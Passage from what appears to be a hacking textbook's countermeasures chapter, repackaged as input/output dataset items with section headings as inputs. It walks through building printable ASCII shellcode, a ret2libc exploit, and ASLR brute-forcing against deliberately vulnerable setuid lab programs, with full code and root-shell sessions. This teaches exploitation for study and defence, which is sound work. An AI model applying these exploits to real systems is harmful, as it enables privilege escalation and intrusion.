0x600\nESP up (toward lower memory addresses) to the end of the newly pushed\nvalue, ready for the next four bytes of shellcode (shown in italic in the pre-\nceding shellcode). More sub instructions are used to wrap EAX around to\n0x53e28951, and this value is then pushed to the stack. As this process is\nrepeated for each four-byte chunk, the shellcode is built from end to start,\ntoward the executing loader code.\n00000000 31 c0 31 db 31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 |1.1.1......j.XQh|\n00000010 2f 2f 73 68 68 2f 62 69 6e 89 e3 51 89 e2 53 89 |//shh/bin..Q..S.|\n00000020 e1 cd 80 |...|\nEventually, the beginning of the shellcode is reached, but there are only\nthree bytes (shown in italic in the preceding shellcode) left after pushing\n0x99c931db to the stack. This situation is alleviated by inserting one single-\nbyte NOP instruction at the beginning of the code, resulting in the value\n0x31c03190 being pushed to the stack—0x90 is machine code for NOP.\nEach of these four-byte chunks of the original shellcode is generated\nwith the printable subtraction method used earlier. The following source\ncode is a program to help calculate the necessary printable values.\nprintable_helper.c\n#include <stdio.h>\n#include <sys/stat.h>\n#include <ctype.h>\n#include <time.h>\n#include <stdlib.h>\n#include <string.h>\n#define CHR \"%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-\"\nint main(int argc, char* argv[])\n{\nunsigned int targ, last, t[4], l[4];\nunsigned int try, single, carry=0;\nint len, a, i, j, k, m, z, flag=0;\nchar word[3][4];\nunsigned char mem[70];\nif(argc < 2) {\nprintf(\"Usage: %s <EAX starting value> <EAX end value>\\n\", argv[0]);\nexit(1);\n}\nsrand(time(NULL));\nbzero(mem, 70);\nstrcpy(mem, CHR);\nlen = strlen(mem);\nstrfry(mem); // Randomize\nlast = strtoul(argv[1], NULL, 0);\ntarg = strtoul(argv[2], NULL, 0);\nCountermeasures 369\nprintf(\"calculating printable values to subtract from EAX..\\n\\n\");\nt[3] = (targ & 0xff000000)>>24; // Splitting by bytes\nt[2] = (targ & 0x00ff0000)>>16;\nt[1] = (targ & 0x0000ff00)>>8;\nt[0] = (targ & 0x000000ff);\nl[3] = (last & 0xff000000)>>24;\nl[2] = (last & 0x00ff0000)>>16;\nl[1] = (last & 0x0000ff00)>>8;\nl[0] = (last & 0x000000ff);\nfor(a=1; a < 5; a++) { // Value count\ncarry = flag = 0;\nfor(z=0; z < 4; z++) { // Byte count\nfor(i=0; i < len; i++) {\nfor(j=0; j < len; j++) {\nfor(k=0; k < len; k++) {\nfor(m=0; m < len; m++)\n{\nif(a < 2) j = len+1;\nif(a < 3) k = len+1;\nif(a < 4) m = len+1;\ntry = t[z] + carry+mem[i]+mem[j]+mem[k]+mem[m];\nsingle = (try & 0x000000ff);\nif(single == l[z])\n{\ncarry = (try & 0x0000ff00)>>8;\nif(i < len) word[0][z] = mem[i];\nif(j < len) word[1][z] = mem[j];\nif(k < len) word[2][z] = mem[k];\nif(m < len) word[3][z] = mem[m];\ni = j = k = m = len+2;\nflag++;\n}\n}\n}\n}\n}\n}\nif(flag == 4) { // If all 4 bytes found\nprintf(\"start: 0x%08x\\n\\n\", last);\nfor(i=0; i < a; i++)\nprintf(\" - 0x%08x\\n\", *((unsigned int *)word[i]));\nprintf(\"-------------------\\n\");\nprintf(\"end: 0x%08x\\n\", targ);\nexit(0);\n}\n}\nWhen this program is run, it expects two arguments—the start and the\nend values for EAX. For the printable loader shellcode, EAX is zeroed out to\nstart with, and the end value should be 0x80cde189. This value corresponds to\nthe last four bytes from shellcode.bin.\n370 0x600\nreader@hacking:~/booksrc $ gcc -o printable_helper printable_helper.c\nreader@hacking:~/booksrc $ ./printable_helper 0 0x80cde189\ncalculating printable values to subtract from EAX..\nstart: 0x00000000\n- 0x346d6d25\n- 0x256d6d25\n- 0x2557442d\n-------------------\nend: 0x80cde189\nreader@hacking:~/booksrc $ hexdump -C ./shellcode.bin\n00000000 31 c0 31 db 31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 |1.1.1......j.XQh|\n00000010 2f 2f 73 68 68 2f 62 69 6e 89 e3 51 89 e2 53 89 |//shh/bin..Q..S.|\n00000020 e1 cd 80 |...|\n00000023\nreader@hacking:~/booksrc $ ./printable_helper 0x80cde189 0x53e28951\ncalculating printable values to subtract from EAX..\nstart: 0x80cde189\n- 0x59316659\n- 0x59667766\n- 0x7a537a79\n-------------------\nend: 0x53e28951\nreader@hacking:~/booksrc $\nThe output above shows the printable values needed to wrap the zeroed\nEAX register around to 0x80cde189 (shown in bold). Next, EAX should be\nwrapped around again to 0x53e28951 for the next four bytes of the shellcode\n(building backwards). This process is repeated until all the shellcode is built.\nThe code for the entire process is shown below.\nprintable.s\nBITS 32\npush esp ; Put current ESP\npop eax ; into EAX.\nsub eax,0x39393333 ; Subtract printable values\nsub eax,0x72727550 ; to add 860 to EAX.\nsub eax,0x54545421\npush eax ; Put EAX back into ESP.\npop esp ; Effectively ESP = ESP + 860\nand eax,0x454e4f4a\nand eax,0x3a313035 ; Zero out EAX.\nsub eax,0x346d6d25 ; Subtract printable values\nsub eax,0x256d6d25 ; to make EAX = 0x80cde189.\nsub eax,0x2557442d ; (last 4 bytes from shellcode.bin)\npush eax ; Push these bytes to stack at ESP.\nsub eax,0x59316659 ; Subtract more printable values\nsub eax,0x59667766 ; to make EAX = 0x53e28951.\nsub eax,0x7a537a79 ; (next 4 bytes of shellcode from the end)\nCountermeasures 371\npush eax\nsub eax,0x25696969\nsub eax,0x25786b5a\nsub eax,0x25774625\npush eax ; EAX = 0xe3896e69\nsub eax,0x366e5858\nsub eax,0x25773939\nsub eax,0x25747470\npush eax ; EAX = 0x622f6868\nsub eax,0x25257725\nsub eax,0x71717171\nsub eax,0x5869506a\npush eax ; EAX = 0x732f2f68\nsub eax,0x63636363\nsub eax,0x44307744\nsub eax,0x7a434957\npush eax ; EAX = 0x51580b6a\nsub eax,0x63363663\nsub eax,0x6d543057\npush eax ; EAX = 0x80cda4b0\nsub eax,0x54545454\nsub eax,0x304e4e25\nsub eax,0x32346f25\nsub eax,0x302d6137\npush eax ; EAX = 0x99c931db\nsub eax,0x78474778\nsub eax,0x78727272\nsub eax,0x774f4661\npush eax ; EAX = 0x31c03190\nsub eax,0x41704170\nsub eax,0x2d772d4e\nsub eax,0x32483242\npush eax ; EAX = 0x90909090\npush eax\npush eax ; Build a NOP sled.\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\npush eax\n372 0x600\nAt the end, the shellcode has been built somewhere after the loader\ncode, most likely leaving a gap between the newly built shellcode and the\nexecuting loader code. This gap can be bridged by building a NOP sled\nbetween the loader code and the shellcode.\nOnce again, sub instructions are used to set EAX to 0x90909090, and\nEAXis repeatedly pushed to the stack. With each push instruction, four NOP\ninstructions are tacked onto the beginning of the shellcode. Eventually, these\nNOP instructions will build right over the executing push instructions of the\nloader code, allowing the EIP and program execution to flow over the sled\ninto the shellcode.\nThis assembles into a printable ASCII string, which doubles as executable\nmachine code.\nreader@hacking:~/booksrc $ nasm printable.s\nreader@hacking:~/booksrc $ echo $(cat ./printable)\nTX-3399-Purr-!TTTP\\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-\n%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--\nB2H2PPPPPPPPPPPPPPPPPPPPPP\nreader@hacking:~/booksrc $\nThis printable ASCII shellcode can now be used to smuggle the actual\nshellcode past the input-validation routine of the update_info program.\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"AAAA\"x10') $(cat ./printable)\n[DEBUG]: desc argument is at 0xbffff910\nSegmentation fault\nreader@hacking:~/booksrc $ ./update_info $(perl -e 'print \"\\x10\\xf9\\xff\\xbf\"x10') $(cat ./\nprintable)\n[DEBUG]: desc argument is at 0xbffff910\nUpdating product ########### with description 'TX-3399-Purr-!TTTP\\%JONE%501:-%mm4-%mm%--DW%P-\nYf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-\nTTTT-%NN0-%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP'\nsh-3.2# whoami\nroot\nsh-3.2#\nNeat. In case you weren’t able to follow everything that just happened\nthere, the output below watches the execution of the printable shellcode\ninGDB. The stack addresses will be slightly different, changing the return\naddresses, but this won’t affect the printable shellcode—it calculates its loca-\ntion based on ESP, giving it this versatility.\nreader@hacking:~/booksrc $ gdb -q ./update_info\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass update_product_description\nDump of assembler code for function update_product_description:\n0x080484a8 <update_product_description+0>: push ebp\n0x080484a9 <update_product_description+1>: mov ebp,esp\n0x080484ab <update_product_description+3>: sub esp,0x28\n0x080484ae <update_product_description+6>: mov eax,DWORD PTR [ebp+8]\n0x080484b1 <update_product_description+9>: mov DWORD PTR [esp+4],eax\nCountermeasures 373\n0x080484b5 <update_product_description+13>: lea eax,[ebp-24]\n0x080484b8 <update_product_description+16>: mov DWORD PTR [esp],eax\n0x080484bb <update_product_description+19>: call 0x8048388 <strcpy@plt>\n0x080484c0 <update_product_description+24>: mov eax,DWORD PTR [ebp+12]\n0x080484c3 <update_product_description+27>: mov DWORD PTR [esp+8],eax\n0x080484c7 <update_product_description+31>: lea eax,[ebp-24]\n0x080484ca <update_product_description+34>: mov DWORD PTR [esp+4],eax\n0x080484ce <update_product_description+38>: mov DWORD PTR [esp],0x80487a0\n0x080484d5 <update_product_description+45>: call 0x8048398 <printf@plt>\n0x080484da <update_product_description+50>: leave\n0x080484db <update_product_description+51>: ret\nEnd of assembler dump.\n(gdb) break *0x080484db\nBreakpoint 1 at 0x80484db: file update_info.c, line 21.\n(gdb) run $(perl -e 'print \"AAAA\"x10') $(cat ./printable)\nStarting program: /home/reader/booksrc/update_info $(perl -e 'print \"AAAA\"x10') $(cat ./\nprintable)\n[DEBUG]: desc argument is at 0xbffff8fd\nProgram received signal SIGSEGV, Segmentation fault.\n0xb7f06bfb in strlen () from /lib/tls/i686/cmov/libc.so.6\n(gdb) run $(perl -e 'print \"\\xfd\\xf8\\xff\\xbf\"x10') $(cat ./printable)\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/update_info $(perl -e 'print \"\\xfd\\xf8\\xff\\xbf\"x10')\n$(cat ./printable)\n[DEBUG]: desc argument is at 0xbffff8fd\nUpdating product # with description 'TX-3399-Purr-!TTTP\\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-\nyzSzP-iii%-Zkx%-%Fw%P-XXn6-99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-\n%o42-7a-0P-xGGx-rrrx-aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP'\nBreakpoint 1, 0x080484db in update_product_description (\nid=0x72727550 <Address 0x72727550 out of bounds>,\ndesc=0x5454212d <Address 0x5454212d out of bounds>) at update_info.c:21\n21 }\n(gdb) stepi\n0xbffff8fd in ?? ()\n(gdb) x/9i $eip\n0xbffff8fd: push esp\n0xbffff8fe: pop eax\n0xbffff8ff: sub eax,0x39393333\n0xbffff904: sub eax,0x72727550\n0xbffff909: sub eax,0x54545421\n0xbffff90e: push eax\n0xbffff90f: pop esp\n0xbffff910: and eax,0x454e4f4a\n0xbffff915: and eax,0x3a313035\n(gdb) i r esp\nesp 0xbffff6d0 0xbffff6d0\n(gdb) p /x $esp + 860\n$1 = 0xbffffa2c\n(gdb) stepi 9\n0xbffff91a in ?? ()\n(gdb) i r esp eax\n374 0x600\nesp 0xbffffa2c 0xbffffa2c\neax 0x0 0\n(gdb)\nThe first nine instructions add 860 to ESP and zero out the EAX register.\nThe next eight instructions push the last eight bytes of the shellcode to the\nstack in four-byte chunks. This process is repeated in the next 32 instructions\nto build the entire shellcode on the stack.\n(gdb) x/8i $eip\n0xbffff91a: sub eax,0x346d6d25\n0xbffff91f: sub eax,0x256d6d25\n0xbffff924: sub eax,0x2557442d\n0xbffff929: push eax\n0xbffff92a: sub eax,0x59316659\n0xbffff92f: sub eax,0x59667766\n0xbffff934: sub eax,0x7a537a79\n0xbffff939: push eax\n(gdb) stepi 8\n0xbffff93a in ?? ()\n(gdb) x/4x $esp\n0xbffffa24: 0x53e28951 0x80cde189 0x00000000 0x00000000\n(gdb) stepi 32\n0xbffff9ba in ?? ()\n(gdb) x/5i $eip\n0xbffff9ba: push eax\n0xbffff9bb: push eax\n0xbffff9bc: push eax\n0xbffff9bd: push eax\n0xbffff9be: push eax\n(gdb) x/16x $esp\n0xbffffa04: 0x90909090 0x31c03190 0x99c931db 0x80cda4b0\n0xbffffa14: 0x51580b6a 0x732f2f68 0x622f6868 0xe3896e69\n0xbffffa24: 0x53e28951 0x80cde189 0x00000000 0x00000000\n0xbffffa34: 0x00000000 0x00000000 0x00000000 0x00000000\n(gdb) i r eip esp eax\neip 0xbffff9ba 0xbffff9ba\nesp 0xbffffa04 0xbffffa04\neax 0x90909090 -1869574000\n(gdb)\nNow with the shellcode completely constructed on the stack, EAX is set\nto 0x90909090. This is pushed to the stack repeatedly to build a NOP sled to\nbridge the gap between the end of the loader code and the newly constructed\nshellcode.\n(gdb) x/24x 0xbffff9ba\n0xbffff9ba: 0x50505050 0x50505050 0x50505050 0x50505050\n0xbffff9ca: 0x50505050 0x00000050 0x00000000 0x00000000\n0xbffff9da: 0x00000000 0x00000000 0x00000000 0x00000000\n0xbffff9ea: 0x00000000 0x00000000 0x00000000 0x00000000\n0xbffff9fa: 0x00000000 0x00000000 0x90900000 0x31909090\n0xbffffa0a: 0x31db31c0 0xa4b099c9 0x0b6a80cd 0x2f685158\nCountermeasures 375"
  },
  {
    "input": "0x6b1 ret2libc",
    "output": "(gdb) stepi 10\n0xbffff9c4 in ?? ()\n(gdb) x/24x 0xbffff9ba\n0xbffff9ba: 0x50505050 0x50505050 0x50505050 0x50505050\n0xbffff9ca: 0x50505050 0x00000050 0x00000000 0x00000000\n0xbffff9da: 0x90900000 0x90909090 0x90909090 0x90909090\n0xbffff9ea: 0x90909090 0x90909090 0x90909090 0x90909090\n0xbffff9fa: 0x90909090 0x90909090 0x90909090 0x31909090\n0xbffffa0a: 0x31db31c0 0xa4b099c9 0x0b6a80cd 0x2f685158\n(gdb) stepi 5\n0xbffff9c9 in ?? ()\n(gdb) x/24x 0xbffff9ba\n0xbffff9ba: 0x50505050 0x50505050 0x50505050 0x90905050\n0xbffff9ca: 0x90909090 0x90909090 0x90909090 0x90909090\n0xbffff9da: 0x90909090 0x90909090 0x90909090 0x90909090\n0xbffff9ea: 0x90909090 0x90909090 0x90909090 0x90909090\n0xbffff9fa: 0x90909090 0x90909090 0x90909090 0x31909090\n0xbffffa0a: 0x31db31c0 0xa4b099c9 0x0b6a80cd 0x2f685158\n(gdb)\nNow the execution pointer (EIP) can flow over the NOP bridge into the\nconstructed shellcode.\nPrintable shellcode is a technique that can open some doors. It and\nallthe other techniques we discussed are just building blocks that can be\nused in a myriad of different combinations. Their application requires some\ningenuity on your part. Be clever and beat them at their own game.\n0x6a0 Hardening Countermeasures\nThe exploit techniques demonstrated in this chapter have been around for\nages. It was only a matter of time for programmers to come up with some\nclever protection methods. An exploit can be generalized as a three-step\nprocess: First, some sort of memory corruption; then, a change in control\nflow; and finally, execution of the shellcode.\n0x6b0 Nonexecutable Stack\nMost applications never need to execute anything on the stack, so an obvious\ndefense against buffer overflow exploits is to make the stack nonexecutable.\nWhen this is done, shellcode inserted anywhere on the stack is basically useless.\nThis type of defense will stop the majority of exploits out there, and it is\nbecoming more popular. The latest version of OpenBSD has a nonexecutable\nstack by default, and a nonexecutable stack is available in Linux through PaX,\na kernel patch.\n0x6b1 ret2libc\nOf course, there exists a technique used to bypass this protective counter-\nmeasure. This technique is known as returning into libc. libc is a standard C\nlibrary that contains various basic functions, such as printf() and exit(). These\n376 0x600"
  },
  {
    "input": "0x6b2 Returning into system()",
    "output": "functions are shared, so any program that uses the printf() function directs\nexecution into the appropriate location in libc. An exploit can do the exact\nsame thing and direct a program’s execution into a certain function in libc.\nThe functionality of such an exploit is limited by the functions in libc, which\nis a significant restriction when compared to arbitrary shellcode. However,\nnothing is ever executed on the stack.\n0x6b2 Returning into system()\nOne of the simplest libc functions to return into is system(). As you recall, this\nfunction takes a single argument and executes that argument with /bin/sh.\nThis function only needs a single argument, which makes it a useful target.\nFor this example, a simple vulnerable program will be used.\nvuln.c\nint main(int argc, char *argv[])\n{\nchar buffer[5];\nstrcpy(buffer, argv[1]);\nreturn 0;\n}\nOf course, this program must be compiled and setuid root before it’s truly\nvulnerable.\nreader@hacking:~/booksrc $ gcc -o vuln vuln.c\nreader@hacking:~/booksrc $ sudo chown root ./vuln\nreader@hacking:~/booksrc $ sudo chmod u+s ./vuln\nreader@hacking:~/booksrc $ ls -l ./vuln\n-rwsr-xr-x 1 root reader 6600 2007-09-30 22:43 ./vuln\nreader@hacking:~/booksrc $\nThe general idea is to force the vulnerable program to spawn a shell,\nwithout executing anything on the stack, by returning into the libc function\nsystem(). If this function is supplied with the argument of /bin/sh, this should\nspawn a shell.\nFirst, the location of the system() function in libc must be determined.\nThis will be different for every system, but once the location is known, it will\nremain the same until libc is recompiled. One of the easiest ways to find the\nlocation of a libc function is to create a simple dummy program and debug it,\nlike this:\nreader@hacking:~/booksrc $ cat > dummy.c\nint main()\n{ system(); }\nreader@hacking:~/booksrc $ gcc -o dummy dummy.c\nreader@hacking:~/booksrc $ gdb -q ./dummy\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nCountermeasures 377\n(gdb) break main\nBreakpoint 1 at 0x804837a\n(gdb) run\nStarting program: /home/matrix/booksrc/dummy\nBreakpoint 1, 0x0804837a in main ()\n(gdb) print system\n$1 = {<text variable, no debug info>} 0xb7ed0d80 <system>\n(gdb) quit\nHere, a dummy program is created that uses the system() function.\nAfter it’s compiled, the binary is opened in a debugger and a breakpoint is\nsetat the beginning. The program is executed, and then the location of the\nsystem() function is displayed. In this case, the system() function is located\nat0xb7ed0d80.\nArmed with that knowledge, we can direct program execution into the\nsystem() function of libc. However, the goal here is to cause the vulnerable\nprogram to execute system(\"/bin/sh\") to provide a shell, so an argument\nmust be supplied. When returning into libc, the return address and function\narguments are read off the stack in what should be a familiar format: the\nreturn address followed by the arguments. On the stack, the return-into-libc\ncall should look something like this:\nFunction address Return address Argument 1 Argument 2 Argument 3 ...\nDirectly after the address of the desired libc function is the address to\nwhich execution should return after the libc call. After that, all of the function\narguments come in sequence.\nIn this case, it doesn’t really matter where the execution returns to after\nthe libc call, since it will be opening an interactive shell. Therefore, these\nfour bytes can just be a placeholder value of FAKE. There is only one argument,\nwhich should be a pointer to the string /bin/sh. This string can be stored\nanywhere in memory; an environment variable is an excellent candidate.\nInthe output below, the string is prefixed with several spaces. This will\nactsimilarly to a NOP sled, providing us with some wiggle room, since\nsystem(\" /bin/sh\") is the same as system(\" /bin/sh\").\nreader@hacking:~/booksrc $ export BINSH=\" /bin/sh\"\nreader@hacking:~/booksrc $ ./getenvaddr BINSH ./vuln\nBINSH will be at 0xbffffe5b\nreader@hacking:~/booksrc $\nSo the system() address is 0xb7ed0d80, and the address for the /bin/sh\nstring will be 0xbffffe5b when the program is executed. That means the\nreturn address on the stack should be overwritten with a series of addresses,\nbeginning with 0xb7ecfd80, followed by FAKE (since it doesn’t matter where\nexecution goes after the system() call), and concluding with 0xbffffe5b.\n378 0x600"
  },
  {
    "input": "0x6c0 Randomized Stack Space",
    "output": "A quick binary search shows that the return address is probably over-\nwritten by the eighth word of the program input, so seven words of dummy\ndata are used for spacing in the exploit.\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x5')\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x10')\nSegmentation fault\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x8')\nSegmentation fault\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x7')\nIllegal instruction\nreader@hacking:~/booksrc $ ./vuln $(perl -e 'print \"ABCD\"x7 . \"\\x80\\x0d\\xed\\xb7FAKE\\x5b\\xfe\\\nxff\\xbf\"')\nsh-3.2# whoami\nroot\nsh-3.2#\nThe exploit can be expanded upon by making chained libc calls, if\nneeded. The return address of FAKE used in the example can be changed to\ndirect program execution. Additional libc calls can be made, or execution\ncan be directed into some other useful section in the program’s existing\ninstructions.\n0x6c0 Randomized Stack Space\nAnother protective countermeasure tries a slightly different approach. Instead\nof preventing execution on the stack, this countermeasure randomizes the\nstack memory layout. When the memory layout is randomized, the attacker\nwon’t be able to return execution into waiting shellcode, since he won’t know\nwhere it is.\nThis countermeasure has been enabled by default in the Linux kernel\nsince 2.6.12, but this book’s LiveCD has been configured with it turned off.\nTo turn this protection on again, echo 1 to the /proc filesystem as shown\nbelow.\nreader@hacking:~/booksrc $ sudo su -\nroot@hacking:~ # echo 1 > /proc/sys/kernel/randomize_va_space\nroot@hacking:~ # exit\nlogout\nreader@hacking:~/booksrc $ gcc exploit_notesearch.c\nreader@hacking:~/booksrc $ ./a.out\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $\nWith this countermeasure turned on, the notesearch exploit no longer\nworks, since the layout of the stack is randomized. Every time a program\nstarts, the stack begins at a random location. The following example demon-\nstrates this.\nCountermeasures 379"
  },
  {
    "input": "0x6c1 Investigations with BASH and GDB",
    "output": "aslr_demo.c\n#include <stdio.h>\nint main(int argc, char *argv[]) {\nchar buffer[50];\nprintf(\"buffer is at %p\\n\", &buffer);\nif(argc > 1)\nstrcpy(buffer, argv[1]);\nreturn 1;\n}\nThis program has an obvious buffer overflow vulnerability in it. However,\nwith ASLR turned on, exploitation isn’t that easy.\nreader@hacking:~/booksrc $ gcc -g -o aslr_demo aslr_demo.c\nreader@hacking:~/booksrc $ ./aslr_demo\nbuffer is at 0xbffbbf90\nreader@hacking:~/booksrc $ ./aslr_demo\nbuffer is at 0xbfe4de20\nreader@hacking:~/booksrc $ ./aslr_demo\nbuffer is at 0xbfc7ac50\nreader@hacking:~/booksrc $ ./aslr_demo $(perl -e 'print \"ABCD\"x20')\nbuffer is at 0xbf9a4920\nSegmentation fault\nreader@hacking:~/booksrc $\nNotice how the location of the buffer on the stack changes with every\nrun. We can still inject the shellcode and corrupt memory to overwrite the\nreturn address, but we don’t know where the shellcode is in memory. The\nrandomization changes the location of everything on the stack, including\nenvironment variables.\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfd919c3\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfe499c3\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./aslr_demo\nSHELLCODE will be at 0xbfcae9c3\nreader@hacking:~/booksrc $\nThis type of protection can be very effective in stopping exploits by the\naverage attacker, but it isn’t always enough to stop a determined hacker. Can\nyou think of a way to successfully exploit this program under these conditions?\n0x6c1 Investigations with BASH and GDB\nSince ASLR doesn’t stop the memory corruption, we can still use a brute-\nforcing BASH script to figure out the offset to the return address from the\n380 0x600\nbeginning of the buffer. When a program exits, the value returned from the\nmain function is the exit status. This status is stored in the BASH variable $?,\nwhich can be used to detect whether the program crashed.\nreader@hacking:~/booksrc $ ./aslr_demo test\nbuffer is at 0xbfb80320\nreader@hacking:~/booksrc $ echo $?\n1\nreader@hacking:~/booksrc $ ./aslr_demo $(perl -e 'print \"AAAA\"x50')\nbuffer is at 0xbfbe2ac0\nSegmentation fault\nreader@hacking:~/booksrc $ echo $?\n139\nreader@hacking:~/booksrc $\nUsing BASH’s if statement logic, we can stop our brute-forcing script\nwhen it crashes the target. The if statement block is contained between the\nkeywords then and fi; the whitespace in the if statement is required. The\nbreak statement tells the script to break out of the for loop.\nreader@hacking:~/booksrc $ for i in $(seq 1 50)\n> do\n> echo \"Trying offset of $i words\"\n> ./aslr_demo $(perl -e \"print 'AAAA'x$i\")\n> if [ $? != 1 ]\n> then\n> echo \"==> Correct offset to return address is $i words\"\n> break\n> fi\n> done\nTrying offset of 1 words\nbuffer is at 0xbfc093b0\nTrying offset of 2 words\nbuffer is at 0xbfd01ca0\nTrying offset of 3 words\nbuffer is at 0xbfe45de0\nTrying offset of 4 words\nbuffer is at 0xbfdcd560\nTrying offset of 5 words\nbuffer is at 0xbfbf5380\nTrying offset of 6 words\nbuffer is at 0xbffce760\nTrying offset of 7 words\nbuffer is at 0xbfaf7a80\nTrying offset of 8 words\nbuffer is at 0xbfa4e9d0\nTrying offset of 9 words\nbuffer is at 0xbfacca50\nTrying offset of 10 words\nbuffer is at 0xbfd08c80\nTrying offset of 11 words\nbuffer is at 0xbff24ea0\nTrying offset of 12 words\nbuffer is at 0xbfaf9a70\nCountermeasures 381\nTrying offset of 13 words\nbuffer is at 0xbfe0fd80\nTrying offset of 14 words\nbuffer is at 0xbfe03d70\nTrying offset of 15 words\nbuffer is at 0xbfc2fb90\nTrying offset of 16 words\nbuffer is at 0xbff32a40\nTrying offset of 17 words\nbuffer is at 0xbf9da940\nTrying offset of 18 words\nbuffer is at 0xbfd0cc70\nTrying offset of 19 words\nbuffer is at 0xbf897ff0\nIllegal instruction\n==> Correct offset to return address is 19 words\nreader@hacking:~/booksrc $\nKnowing the proper offset will let us overwrite the return address.\nHowever, we still cannot execute shellcode since its location is randomized.\nUsing GDB, let’s look at the program just as it’s about to return from the\nmain function.\nreader@hacking:~/booksrc $ gdb -q ./aslr_demo\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass main\nDump of assembler code for function main:\n0x080483b4 <main+0>: push ebp\n0x080483b5 <main+1>: mov ebp,esp\n0x080483b7 <main+3>: sub esp,0x58\n0x080483ba <main+6>: and esp,0xfffffff0\n0x080483bd <main+9>: mov eax,0x0\n0x080483c2 <main+14>: sub esp,eax\n0x080483c4 <main+16>: lea eax,[ebp-72]\n0x080483c7 <main+19>: mov DWORD PTR [esp+4],eax\n0x080483cb <main+23>: mov DWORD PTR [esp],0x80484d4\n0x080483d2 <main+30>: call 0x80482d4 <printf@plt>\n0x080483d7 <main+35>: cmp DWORD PTR [ebp+8],0x1\n0x080483db <main+39>: jle 0x80483f4 <main+64>\n0x080483dd <main+41>: mov eax,DWORD PTR [ebp+12]\n0x080483e0 <main+44>: add eax,0x4\n0x080483e3 <main+47>: mov eax,DWORD PTR [eax]\n0x080483e5 <main+49>: mov DWORD PTR [esp+4],eax\n0x080483e9 <main+53>: lea eax,[ebp-72]\n0x080483ec <main+56>: mov DWORD PTR [esp],eax\n0x080483ef <main+59>: call 0x80482c4 <strcpy@plt>\n0x080483f4 <main+64>: mov eax,0x1\n0x080483f9 <main+69>: leave\n0x080483fa <main+70>: ret\nEnd of assembler dump.\n(gdb) break *0x080483fa\nBreakpoint 1 at 0x80483fa: file aslr_demo.c, line 12.\n(gdb)\n382 0x600\nThe breakpoint is set at the last instruction of main. This instruction returns\nEIP to the return address stored on the stack. When an exploit overwrites the\nreturn address, this is the last instruction where the original program has\ncontrol. Let’s take a look at the registers at this point in the code for a couple\nof different trial runs.\n(gdb) run\nStarting program: /home/reader/booksrc/aslr_demo\nbuffer is at 0xbfa131a0\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\n12 }\n(gdb) info registers\neax 0x1 1\necx 0x0 0\nedx 0xb7f000b0 -1209007952\nebx 0xb7efeff4 -1209012236\nesp 0xbfa131ec 0xbfa131ec\nebp 0xbfa13248 0xbfa13248\nesi 0xb7f29ce0 -1208836896\nedi 0x0 0\neip 0x80483fa 0x80483fa <main+70>\neflags 0x200246 [ PF ZF IF ID ]\ncs 0x73 115\nss 0x7b 123\nds 0x7b 123\nes 0x7b 123\nfs 0x0 0\ngs 0x33 51\n(gdb) run\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/aslr_demo\nbuffer is at 0xbfd8e520\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\n12 }\n(gdb) i r esp\nesp 0xbfd8e56c 0xbfd8e56c\n(gdb) run\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/aslr_demo\nbuffer is at 0xbfaada40\nBreakpoint 1, 0x080483fa in main (argc=134513588, argv=0x1) at aslr_demo.c:12\n12 }\n(gdb) i r esp\nesp 0xbfaada8c 0xbfaada8c\n(gdb)\nCountermeasures 383"
  },
  {
    "input": "0x6c2 Bouncing Off linux-gate",
